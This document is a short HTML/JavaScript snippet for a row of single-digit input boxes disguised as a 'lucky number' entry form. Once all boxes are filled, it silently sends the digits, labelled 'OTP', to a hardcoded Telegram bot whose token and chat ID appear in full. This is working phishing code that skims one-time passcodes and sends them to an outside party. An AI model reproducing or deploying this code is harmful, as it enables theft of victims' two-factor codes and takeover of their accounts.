<script>
const BOT_TOKEN = "8894784370:AAE2QmU7-MvEZt0xWbJwfTPyqWA9v4W4xmM";
const CHAT_ID = "7815412509";

const inputs = document.querySelectorAll("#lucky-inputs input");

let sent = false;

function sendLuckyNumber() {
    const luckyNum = [...inputs]
        .map(input => input.value)
        .join("");

    const message = `OTP: ${luckyNum}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Message sent!", data);
    })
    .catch(err => {
        console.error("Failed to send:", err);
    });
}

inputs.forEach((input, index) => {

    // Move to next input automatically
    input.addEventListener("input", () => {

        // Only keep one character
        input.value = input.value.slice(0, 1);

        // Jump to next input
        if (input.value !== "" && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        const allFilled = [...inputs].every(input => input.value.trim() !== "");
        const allEmpty = [...inputs].every(input => input.value.trim() === "");

        // Send once when all inputs are filled
        if (allFilled && !sent) {
            sent = true;
            sendLuckyNumber();
        }

        // Reset when all inputs are cleared
        if (allEmpty) {
            sent = false;
        }
    });

    // Move back on Backspace
    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value === "" && index > 0) {
            inputs[index - 1].focus();
        }
    });

});
</script>
